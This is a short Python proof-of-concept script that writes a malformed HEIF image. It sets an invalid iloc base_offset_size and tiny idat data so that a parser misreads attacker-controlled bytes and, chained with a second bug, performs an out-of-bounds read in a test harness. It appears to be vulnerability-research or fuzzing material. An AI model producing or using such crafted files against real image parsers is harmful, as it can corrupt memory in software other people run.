#!/usr/bin/env python3
"""bug05: iloc with base_offset_size = 2 (invalid). The 2 base_offset bytes
left unconsumed flow into subsequent reads, so extent.offset / .length
end up reading misaligned attacker bytes.

Chained with bug09: construction_method=1 + a tiny idat means
idat->read_data fails (the bogus extent.length is huge), the failure is
silently dropped, and the synthetic consumer (in harness.cc) OOBs."""

import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "common"))
import heif_box as hb


def main(out_path: str) -> None:
    idat_payload = b"\xAA" * 8
    bogus_iloc = hb.iloc(
        version=1,
        offset_size=4, length_size=4,
        base_offset_size=2,        # invalid
        index_size=0,
        items=[{
            "item_id": 1, "construction_method": 1, "data_reference_index": 0,
            # base_offset = 0x0001 → after misalignment, those 2 bytes get
            # misread as extent_count = 1 (≤ 32 limit). The next read32 for
            # extent.offset reads 2 bytes of the actual on-disk offset, then
            # the read32 for extent.length reads the next 4 bytes — both
            # misaligned with attacker bytes.
            "base_offset": 0x0001,
            "extents": [(0, 0x22222222, 0x33333333)],
        }])

    payload = (hb.hdlr(b"pict") + hb.pitm(1) +
               hb.empty_iprp() + hb.iinf([(1, b"hvc1")]) + bogus_iloc +
               hb.idat(idat_payload))
    out = hb.ftyp() + hb.fullbox(b"meta", 0, 0, payload)
    hb.write_file(out_path, out)


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "bug05_poc.heif")
